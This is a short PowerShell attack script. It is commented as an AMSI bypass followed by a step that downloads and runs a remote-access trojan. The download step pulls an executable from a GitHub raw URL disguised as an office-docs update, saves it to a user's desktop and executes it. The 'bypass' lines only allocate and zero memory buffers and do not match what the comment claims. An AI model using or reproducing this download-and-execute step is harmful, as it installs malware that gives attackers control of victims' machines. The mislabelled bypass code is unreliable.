# AMSI Bypass
$amsiBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(2)
[System.Runtime.InteropServices.Marshal]::WriteInt16($amsiBuffer, 0)
$amsiResult = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
[System.Runtime.InteropServices.Marshal]::WriteInt32($amsiResult, 0)

# Download and execute RAT
$filePath = "C:\Users\ancho\Desktop\test_update.exe"
$url = "https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/update.exe"
Invoke-WebRequest -Uri $url -OutFile $filePath
& $filePath

# Cleanup
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($amsiBuffer)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($amsiResult)